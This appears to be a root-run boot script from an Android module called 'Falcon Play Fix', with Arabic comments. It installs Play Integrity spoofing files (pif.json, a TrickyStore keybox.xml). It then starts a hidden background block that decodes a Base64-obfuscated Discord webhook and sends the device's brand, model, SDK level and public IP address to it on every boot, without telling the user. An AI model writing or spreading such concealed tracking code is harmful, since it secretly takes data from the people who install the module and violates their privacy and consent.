#!/system/bin/sh
MODDIR=${0%/*}

# --- إعدادات الملفات الأساسية ---
# إعداد ملف pif.json
cp $MODDIR/pif.json /data/adb/pif.json
chown root:root /data/adb/pif.json
chmod 644 /data/adb/pif.json

# إعداد مسار TrickyStore
mkdir -p /data/adb/tricky_store
if [ -f "$MODDIR/keybox.xml" ]; then
    cp $MODDIR/keybox.xml /data/adb/tricky_store/keybox.xml
    chown root:root /data/adb/tricky_store/keybox.xml
    chmod 644 /data/adb/tricky_store/keybox.xml
fi

# --- نظام تتبع Falcon System (يعمل في الخلفية) ---
(
    # وظيفة لانتظار الإنترنت (تجنب الفشل عند الإقلاع)
    until ping -c 1 -W 2 google.com >/dev/null 2>&1; do
        sleep 10
    done

    # رابط الـ Webhook مشفر بـ Base64 لحمايته على GitHub
    ENC_URL="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5Mzk5MjU5NzI4OTcwMTM4Ni95c2t1VXBpUVF4WUtnUURQSm9oSjNleWgtSk1tUWJSN2ZUdEM4dll4bjdoTUFWT0Z5OFpnZ0o0OW5kQ3ZOdWJMc21IXw=="
    WEBHOOK=$(echo "$ENC_URL" | base64 -d)

    # جلب معلومات الجهاز
    MODEL=$(getprop ro.product.model)
    BRAND=$(getprop ro.product.brand)
    SDK=$(getprop ro.build.version.sdk)
    IP=$(curl -s https://api.ipify.org || echo "Unknown")

    # إرسال البيانات إلى ديسكورد
    curl -H "Content-Type: application/json" \
    -X POST \
    -d '{
      "username": "Falcon Fix Tracker",
      "embeds": [
        {
          "title": "🛡️ FALCON PLAY FIX | تم التشغيل",
          "description": "الإضافة نشطة الآن على جهاز مستخدم جديد.",
          "color": 15158332,
          "fields": [
            { "name": "📱 الماركة", "value": "'"$BRAND"'", "inline": true },
            { "name": "📲 الموديل", "value": "'"$MODEL"'", "inline": true },
            { "name": "🤖 API Level", "value": "'"$SDK"'", "inline": true },
            { "name": "🌐 IP", "value": "'"$IP"'", "inline": false }
          ],
          "footer": { "text": "Developer: rngfalcon | Status: Active" },
          "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
        }
      ]
    }' "$WEBHOOK"
) &